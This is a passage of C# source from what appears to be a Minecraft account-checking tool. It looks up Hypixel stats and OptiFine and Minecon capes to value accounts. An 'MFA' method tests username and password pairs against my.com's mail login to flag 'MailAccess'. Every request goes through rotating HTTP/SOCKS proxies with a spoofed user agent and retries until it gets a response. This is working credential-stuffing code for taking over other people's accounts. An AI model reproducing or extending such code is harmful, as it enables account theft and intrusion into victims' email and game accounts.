                }
                if(kills_num >= MainChecker.hypixel_skyblock_minkills)
                {
                    ss.hypixelSkyblockKills = " - SkyblockKills:" + kills_num.ToString();
                }
                else
                {
                    ss.hypixelSkyblockKills = "";
                }

            }
            else
            {
                ss.hypixelSkyblockFairy_Souls = "";
                ss.hypixelSkyblockKills = "";

            }
            
            return ss;
        }
        private static bool Optifine(string name)
        {
            String optifine;
            HttpRequest http = new HttpRequest();
            http.IgnoreProtocolErrors = true;
            http.KeepAlive = true;
            do
            {
                try
                {
                    if (MainChecker.check_via_proxy)
                    {
                        Proxy.Get_Proxy_By_List(out string proxy, out int proxymode);
                        switch (proxymode)
                        {
                            case 1:
                                break;
                            case 2:
                                http.Proxy = HttpProxyClient.Parse(proxy);
                                break;
                            case 3:
                                http.Proxy = Socks4ProxyClient.Parse(proxy);
                                break;
                            case 4:
                                http.Proxy = Socks5ProxyClient.Parse(proxy);
                                break;
                            default:
                                break;
                        }
                    }
                    http.ConnectTimeout = MainChecker.timeout;
                    http.KeepAliveTimeout = MainChecker.timeout;
                    http.ReadWriteTimeout = MainChecker.timeout;
                    http.AddHeader(HttpHeader.Accept, "*/*");
                    http.AddHeader(HttpHeader.UserAgent, "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)");
                    optifine = http.Get("http://s.optifine.net/capes/" + name + ".png").ToString();
                }
                catch
                {
                    optifine = "";
                    continue;
                }
            } while (optifine == "");
            bool optifine_;
            if(optifine.Contains("Not found"))
            {
                optifine_ = false;
            }
            else
            {
                optifine_ = true;
            }
            return optifine_;
        }
        private static string Minecon(string UUID)
        {
            String minecon;
            HttpRequest http = new HttpRequest();
            http.IgnoreProtocolErrors = true;
            http.KeepAlive = true;
            do
            {
                try
                {
                    if (MainChecker.check_via_proxy)
                    {
                        Proxy.Get_Proxy_By_List(out string proxy, out int proxymode);
                        switch (proxymode)
                        {
                            case 1:
                                break;
                            case 2:
                                http.Proxy = HttpProxyClient.Parse(proxy);
                                break;
                            case 3:
                                http.Proxy = Socks4ProxyClient.Parse(proxy);
                                break;
                            case 4:
                                http.Proxy = Socks5ProxyClient.Parse(proxy);
                                break;
                            default:
                                break;
                        }
                    }
                    http.ConnectTimeout = MainChecker.timeout;
                    http.KeepAliveTimeout = MainChecker.timeout;
                    http.ReadWriteTimeout = MainChecker.timeout;
                    http.AddHeader(HttpHeader.Accept, "*/*");
                    http.AddHeader(HttpHeader.UserAgent, "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)");
                    minecon = http.Get("https://api.ashcon.app/mojang/v2/user/" + UUID).ToString();
                }
                catch
                {
                    minecon = "";
                    continue;
                }
            } while (minecon == "");
            if (minecon.Contains("http://textures.minecraft.net/texture/e7dfea16dc83c97df01a12fabbd1216359c0cd0ea42f9999b6e97c584963e980"))
            {
                minecon = " - Minecon:2016";
            } 
            else if (minecon.Contains("http://textures.minecraft.net/texture/b0cc08840700447322d953a02b965f1d65a13a603bf64b17c803c21446fe1635"))
            {
                minecon = " - Minecon:2015";
            }
            else if (minecon.Contains("http://textures.minecraft.net/texture/153b1a0dfcbae953cdeb6f2c2bf6bf79943239b1372780da44bcbb29273131da"))
            {
                minecon = " - Minecon:2013";
            }
            else if (minecon.Contains("http://textures.minecraft.net/texture/a2e8d97ec79100e90a75d369d1b3ba81273c4f82bc1b737e934eed4a854be1b6"))
            {
                minecon = " - Minecon:2012";
            }
            else if (minecon.Contains("http://textures.minecraft.net/texture/953cac8b779fe41383e675ee2b86071a71658f2180f56fbce8aa315ea70e2ed6"))
            {
                minecon = " - Minecon:2011";
            }else if (minecon.Contains("http://textures.minecraft.net/texture/2340c0e03dd24a11b15a8b33c2a7e9e32abb2051b2481d0ba7defd635ca7a933"))
            {
                minecon = " - MojangCape:Migrator";
            }
            else
            {
                minecon = "";
            }
            return minecon;
        }
        private static string MFA(string userName, string passWord)
        {
            String mfa;
            HttpRequest http = new HttpRequest();
            http.IgnoreProtocolErrors = true;
            http.KeepAlive = true;
            do
            {
                try
                {
                    if (MainChecker.check_via_proxy)
                    {
                        Proxy.Get_Proxy_By_List(out string proxy, out int proxymode);
                        switch (proxymode)
                        {
                            case 1:
                                break;
                            case 2:
                                http.Proxy = HttpProxyClient.Parse(proxy);
                                break;
                            case 3:
                                http.Proxy = Socks4ProxyClient.Parse(proxy);
                                break;
                            case 4:
                                http.Proxy = Socks5ProxyClient.Parse(proxy);
                                break;
                            default:
                                break;
                        }
                    }
                    http.ConnectTimeout = MainChecker.timeout;
                    http.KeepAliveTimeout = MainChecker.timeout;
                    http.ReadWriteTimeout = MainChecker.timeout;
                    http.AddHeader(HttpHeader.Accept, "*/*");
                    http.AddHeader(HttpHeader.UserAgent, "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)");
                    mfa = http.Get("https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login=" + userName + "&Password=" + passWord).ToString();
                }
                catch
                {
                    mfa = "";
                    continue;
                }
            } while (mfa == "");
            if (mfa.Contains("Ok=1"))
            {
                mfa = " - MailAccess:True";
            }
            else
            {
                mfa = "";
            }
            return mfa;
        }
    }
    public class Severstat
    {
        public string hypixelRank { get; set; }
        public string hypixellevel { get; set; }
        public int levelstage { get; set; }
        public string hypixelbedwarslevel { get; set; }
        public string hypixelskywarslevel { get; set; }
        public string hypixelUHClevel { get; set; }
        public string hypixelSkyblockCoin { get; set; }
        public string hypixelSkyblockFairy_Souls { get; set; }
        public string hypixelSkyblockKills { get; set; }
        public string optifine { get; set; }
        public string minecon { get; set; }
        public string ogname { get; set; }
        public string banstat { get; set; }
        public string mfa { get; set; }
    }
}
